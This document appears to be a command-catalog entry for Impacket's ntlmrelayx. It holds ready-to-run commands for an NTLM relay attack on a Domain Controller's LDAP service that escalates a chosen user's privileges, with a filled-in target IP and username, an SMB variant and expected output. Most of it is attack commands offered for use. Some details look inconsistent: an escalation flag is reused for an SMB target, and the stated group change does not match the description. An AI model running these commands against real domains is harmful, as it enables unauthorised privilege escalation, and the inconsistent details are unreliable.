---
id: 8e80adb9-59cc-45df-ac6e-eec5c7c1c11d
name: ntlmrelayx-ldap-escalate-user
type: command
executor: bash
data: >-
  sudo ntlmrelayx.py -t ldap://$_TARGET_DC_IP --no-wcf-server --escalate-user
  $_TARGET_USER
output: null
created_at: '2023-04-06T03:56:05.609225+00:00'
updated_at: '2023-04-10T20:26:29.616322+00:00'
platforms:
  - Linux
tags:
  - ntlm
  - relay
  - escalation
verified: true
validated: true
---

# ntlmrelayx-ldap-escalate-user

## Command

```bash
sudo ntlmrelayx.py -t ldap://$_TARGET_DC_IP --no-wcf-server --escalate-user $_TARGET_USER
```

## Description

This command launches Impacket's ntlmrelayx to perform an NTLM relay attack targeting LDAP on a Domain Controller, escalating the relayed user's privileges by adding them to admin groups.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t ldap://$_TARGET_DC_IP | Target LDAP URI (e.g., ldap://192.168.83.135) | Yes |
| --no-wcf-server | Disable WCF server for simpler relay | Yes |
| --escalate-user $_TARGET_USER | Escalate specified user (e.g., winrm_user_1) | Yes |

## Examples

### Basic Usage

```bash
sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
```

### Advanced Usage

With SMB target:
```bash
sudo ntlmrelayx.py -t smb://$_TARGET_IP --escalate-user $_USER
```

## Expected Output

Startup: "[*] NTLMRelayXServer started on 0.0.0.0:80". Upon relay: "[*] User winrm_user_1 added to Remote Desktop Users group". Errors if no incoming auth or LDAP bind fails.

## Related

- [[commands/impacket-psexec-remote-execution]]
- [[procedures/DCOM-DCE-RPC-Relay-using-RemotePotato0]]
